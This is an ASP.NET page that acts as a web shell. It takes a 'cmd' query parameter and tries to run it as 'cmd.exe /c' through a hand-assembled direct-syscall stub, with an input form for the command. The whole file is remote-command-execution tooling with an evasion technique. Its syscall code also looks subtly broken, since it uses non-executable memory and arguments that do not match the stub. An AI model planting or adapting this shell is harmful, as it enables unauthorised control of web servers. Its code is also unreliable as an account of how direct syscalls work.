<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (string.IsNullOrEmpty(cmd)) return;

        // Syscall stub for NtCreateProcessEx (Windows 10 20H2 syscall number 0xC2)
        byte[] syscallStub = {
            0x48, 0x31, 0xC0,             // xor rax, rax
            0xB8, 0xC2, 0x00, 0x00, 0x00, // mov eax, 0xC2
            0x4C, 0x8B, 0xD1,             // mov r10, rcx
            0x0F, 0x05,                   // syscall
            0xC3                          // ret
        };
        IntPtr stubPtr = Marshal.AllocHGlobal(syscallStub.Length);
        Marshal.Copy(syscallStub, 0, stubPtr, syscallStub.Length);
        IntPtr cmdPtr = Marshal.StringToHGlobalAnsi("cmd.exe /c " + cmd);
        ((delegate* unmanaged<IntPtr, uint, IntPtr>)stubPtr)(cmdPtr, 0, IntPtr.Zero);
        Response.Write("Syscall stub invoked (direct syscall).");
    }
</script>
<html><body><h2>WinExec via Direct Syscall</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
